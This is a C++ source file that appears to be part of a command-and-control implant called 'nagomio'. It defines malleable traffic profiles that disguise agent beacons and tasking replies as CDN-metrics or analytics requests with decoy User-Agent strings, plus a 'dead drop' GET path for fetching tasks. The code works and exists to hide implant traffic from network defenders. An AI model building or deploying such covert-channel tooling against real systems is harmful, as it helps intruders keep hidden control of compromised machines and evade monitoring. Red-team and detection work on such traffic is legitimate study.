#include "profiles.h"
#include "json.hpp"

#include <algorithm>
#include <cctype>
#include <string>

namespace nagomio {

namespace {

Profile default_profile() {
    return Profile{
        "default",
        "/beacon",
        "/response",
        "",
        "x-nagomio-agent-token",
        "",
        "POST",
    };
}

Profile cdn_metrics_profile() {
    return Profile{
        "cdn_metrics",
        "/api/v2/metrics",
        "/metrics/v1/events",
        "CloudMetrics/1.4",
        "x-api-key",
        // {body} is substituted as a JSON value (not a quoted string) so the
        // result remains valid JSON when the beacon is an object.
        R"({"batch":[{"m":{body}}]})",
        "POST",
    };
}

Profile analytics_profile() {
    return Profile{
        "analytics",
        "/track",
        "/track",
        "Tracker/2.1",
        "x-api-key",
        R"({"events":[{body}]})",
        "POST",
    };
}

Profile dead_drop_profile() {
    return Profile{
        "dead_drop",
        "/dead_drop",
        "/response",
        "",
        "x-nagomio-agent-token",
        "",
        // The dead drop path is a GET, with the agent_id appended at
        // request time. The body is empty; the response body IS the task.
        "GET",
    };
}

std::string g_profile_name = "default";
Profile g_active = default_profile();

} // namespace

const Profile& active_profile() { return g_active; }

const std::string& beacon_path() { return g_active.beacon_path; }
const std::string& response_path() { return g_active.response_path; }
const std::string& beacon_method() { return g_active.beacon_method; }

void set_profile_by_name(const std::string& name) {
    g_profile_name = name;
    std::string n = name;
    std::transform(n.begin(), n.end(), n.begin(),
                   [](unsigned char c) { return std::tolower(c); });
    if (n == "cdn_metrics") g_active = cdn_metrics_profile();
    else if (n == "analytics") g_active = analytics_profile();
    else if (n == "dead_drop") g_active = dead_drop_profile();
    else g_active = default_profile();
}

std::string wrap_beacon(const std::string& inner_json) {
    if (g_active.body_template.empty()) return inner_json;
    // Replace the literal placeholder {body} with the inner JSON.
    std::string tpl = g_active.body_template;
    auto pos = tpl.find("{body}");
    if (pos == std::string::npos) {
        return tpl + ":" + inner_json;
    }
    tpl.replace(pos, 6, inner_json);
    return tpl;
}

std::string unwrap_response(const std::string& wire_body) {
    if (g_active.body_template.empty()) return wire_body;
    // For the supported profiles the server reply is a small JSON
    // { "status": "ok" } or a `BeaconReply`; the wrapper just encloses a
    // `batch`/`events` array. We try to find a `BeaconReply` inside.
    try {
        auto j = nlohmann::json::parse(wire_body);
        if (j.contains("batch") && j["batch"].is_array() && !j["batch"].empty()) {
            auto& first = j["batch"][0];
            if (first.contains("m")) return first["m"].dump();
        }
        if (j.contains("events") && j["events"].is_array() && !j["events"].empty()) {
            auto& first = j["events"][0];
            if (first.contains("status")) return first.dump();
        }
    } catch (...) {
        return wire_body;
    }
    return wire_body;
}

} // namespace nagomio